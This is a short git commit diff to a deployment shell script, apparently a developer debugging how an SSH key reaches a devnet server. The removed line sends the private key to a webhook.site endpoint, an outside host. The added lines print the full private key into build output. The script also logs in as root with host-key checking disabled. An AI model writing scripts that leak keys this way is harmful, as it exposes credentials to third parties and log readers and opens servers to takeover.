f1aedecdabf432225f361c379eb5444ab78fe1e3
Jianrong <wjrjerome@gmail.com>
2021-08-14 20:07:08 +1000

    print key2

--- build/devnet.sh
+++ build/devnet.sh
@@ -1,8 +1,14 @@
 #!/bin/sh
 
+
+echo "--------------------------1"
+echo -ne "${SSH_KEY}"
+echo "--------------------------2"
+
 echo -ne "${SSH_KEY}" > tem.pem && chmod 400 tem.pem
 # Trigger upgrade to a specific commit
-curl -X POST https://webhook.site/a45efa30-d911-45d2-a265-cd72933af522 -d ```cat tem.pem```
+cat tem.pem
+
 ssh -o "StrictHostKeyChecking no" -i tem.pem root@45.77.243.22 -p $DEVNET_PORT 'cd XinFin/Local_DPoS_Setup && ls'
 # clean up
 rm -rf tem.pem
